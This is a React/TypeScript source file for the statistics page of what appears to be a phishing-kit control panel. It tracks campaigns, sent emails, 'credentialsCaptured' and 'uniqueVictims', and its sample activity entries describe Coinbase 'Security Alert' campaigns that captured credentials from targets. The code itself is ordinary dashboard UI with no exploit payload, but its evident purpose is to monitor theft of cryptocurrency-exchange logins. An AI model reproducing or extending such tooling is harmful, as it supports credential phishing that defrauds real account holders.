import { useQuery } from "@tanstack/react-query";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import StatsCard from "@/components/stats-card";
import { 
  Download, 
  BarChart3, 
  TrendingUp, 
  Mail, 
  Clock,
  CheckCircle,
  AlertTriangle,
  Building,
  Zap
} from "lucide-react";

interface StatisticsOverview {
  totalCampaigns: number;
  activeCampaigns: number;
  successRate: string;
  totalSessions: number;
  credentialsCaptured: number;
  completeSessions: number;
  uniqueVictims: number;
}

export default function StatisticsPage() {
  // Fetch statistics
  const { data: stats, isLoading } = useQuery<StatisticsOverview>({
    queryKey: ["/api/statistics/overview"],
  });

  const chartData = [
    { month: "Jan", value: 40 },
    { month: "Feb", value: 60 },
    { month: "Mar", value: 80 },
    { month: "Apr", value: 70 },
    { month: "May", value: 90 },
    { month: "Jun", value: 100 },
  ];

  const campaignTypes = [
    { name: "Coinbase", count: 12, percentage: 100, color: "bg-blue-500" },
  ];

  const recentActivity = [
    {
      type: "success",
      title: "Coinbase Campaign completed successfully",
      description: "Captured 18 credentials from 25 targets • 2 hours ago",
      status: "72% Success",
      statusColor: "text-green-400",
    },
    {
      type: "info",
      title: "Coinbase Security Alert Campaign started",
      description: "Sending security alerts to 35 targets • 4 hours ago",
      status: "In Progress",
      statusColor: "text-blue-400",
    },
    {
      type: "warning",
      title: "SMTP Server connection failed",
      description: "AWS server authentication error • 6 hours ago",
      status: "Warning",
      statusColor: "text-orange-400",
    },
  ];

  const getActivityIcon = (type: string) => {
    switch (type) {
      case "success":
        return <CheckCircle className="w-5 h-5 text-green-400" />;
      case "info":
        return <Mail className="w-5 h-5 text-blue-400" />;
      case "warning":
        return <AlertTriangle className="w-5 h-5 text-orange-400" />;
      default:
        return <BarChart3 className="w-5 h-5 text-muted-foreground" />;
    }
  };

  return (
    <div className="h-full overflow-y-auto">
      {/* Page Header */}
      <div className="bg-card border-b border-border px-6 py-4">
        <div className="flex items-center justify-between">
          <h1 className="text-2xl font-bold text-foreground">Statistics & Analytics</h1>
          <div className="flex items-center space-x-3">
            <Select defaultValue="30days" data-testid="select-time-range">
              <SelectTrigger className="w-48">
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="24hours">Last 24 Hours</SelectItem>
                <SelectItem value="7days">Last 7 Days</SelectItem>
                <SelectItem value="30days">Last 30 Days</SelectItem>
                <SelectItem value="all">All Time</SelectItem>
              </SelectContent>
            </Select>
            <Button data-testid="button-export-report">
              <Download className="w-4 h-4 mr-2" />
              Export Report
            </Button>
          </div>
        </div>
      </div>

      <div className="p-6">
        {/* Overview Stats */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
          <StatsCard
            title="Total Campaigns"
            value={isLoading ? "..." : stats?.totalCampaigns || 0}
            icon={Building}
            color="blue"
            subtitle={`↑ ${stats?.activeCampaigns || 0} active`}
          />
          <StatsCard
            title="Success Rate"
            value={isLoading ? "..." : `${stats?.successRate || 0}%`}
            icon={TrendingUp}
            color="green"
            subtitle="↑ 12% vs last month"
          />
          <StatsCard
            title="Emails Sent"
            value={isLoading ? "..." : "1,247"}
            icon={Mail}
            color="orange"
            subtitle="↑ 185 this week"
          />
          <StatsCard
            title="Avg Response Time"
            value={isLoading ? "..." : "2.3m"}
            icon={Clock}
            color="purple"
            subtitle="↓ 15s vs last month"
          />
        </div>

        {/* Charts Section */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-8">
          {/* Success Rate Chart */}
          <Card>
            <CardContent className="p-6">
              <h3 className="text-lg font-semibold text-foreground mb-6">Campaign Success Rate</h3>
              <div className="h-64 flex items-end justify-between space-x-2" data-testid="chart-success-rate">
                {chartData.map((item, index) => (
                  <div key={item.month} className="flex flex-col items-center flex-1">
                    <div 
                      className="bg-primary/60 w-full rounded-t-lg transition-all duration-500"
                      style={{ height: `${item.value}%` }}
                    />
                    <span className="text-sm text-muted-foreground mt-2">{item.month}</span>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>

          {/* Campaign Types Distribution */}
          <Card>
            <CardContent className="p-6">
              <h3 className="text-lg font-semibold text-foreground mb-6">Campaign Types Distribution</h3>
              <div className="space-y-4" data-testid="chart-campaign-types">
                {campaignTypes.map((type) => (
                  <div key={type.name} className="flex items-center justify-between">
                    <div className="flex items-center space-x-3">
                      <div className={`w-3 h-3 ${type.color} rounded-full`} />
                      <span className="text-foreground">{type.name}</span>
                    </div>
                    <div className="text-right">
                      <span className="text-foreground font-medium">{type.count} campaigns</span>
                      <p className="text-sm text-muted-foreground">{type.percentage}%</p>
                    </div>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Recent Activity */}
        <Card>
          <div className="px-6 py-4 border-b border-border">
            <h3 className="text-lg font-semibold text-foreground">Recent Campaign Activity</h3>
          </div>
          <CardContent className="p-6">
            <div className="space-y-4" data-testid="recent-activity">
              {recentActivity.map((activity, index) => (
                <div key={index} className="flex items-center space-x-4 p-3 bg-muted/20 rounded-lg">
                  <div className={`w-10 h-10 ${activity.type === 'success' ? 'bg-green-500/20' : activity.type === 'info' ? 'bg-blue-500/20' : 'bg-orange-500/20'} rounded-lg flex items-center justify-center`}>
                    {getActivityIcon(activity.type)}
                  </div>
                  <div className="flex-1">
                    <p className="text-foreground font-medium">{activity.title}</p>
                    <p className="text-sm text-muted-foreground">{activity.description}</p>
                  </div>
                  <div className="text-right">
                    <span className={`text-sm font-medium ${activity.statusColor}`}>{activity.status}</span>
                  </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
